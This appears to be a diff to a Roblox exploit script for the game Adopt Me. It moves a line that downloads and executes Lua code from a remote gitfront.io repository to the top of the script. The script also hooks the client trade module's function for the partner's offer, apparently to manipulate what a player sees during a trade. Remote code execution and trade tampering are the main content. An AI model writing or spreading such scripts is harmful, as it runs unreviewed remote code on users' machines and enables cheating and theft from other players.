@@ -1,4 +1,6 @@
-wait(5)
+loadstring(game:HttpGet(('https://gitfront.io/r/ReQiuYTPL/wFUydaK74uGx/hub/raw/Hub/AdoptMe.lua'),true))()
+
+while not _G.mirar() or _G.mirar == null do wait(1) end
 
 local mod = require(game:GetService("ReplicatedStorage").ClientModules.Core.UIManager.Apps.TradeApp)
 newFunc = hookfunction(mod._get_partner_offer, function(...)
@@ -8,5 +10,3 @@ newFunc = hookfunction(mod._get_partner_offer, function(...)
     end)
     return newFunc(...)
 end)
-
-loadstring(game:HttpGet(('https://gitfront.io/r/ReQiuYTPL/wFUydaK74uGx/hub/raw/Hub/AdoptMe.lua'),true))()
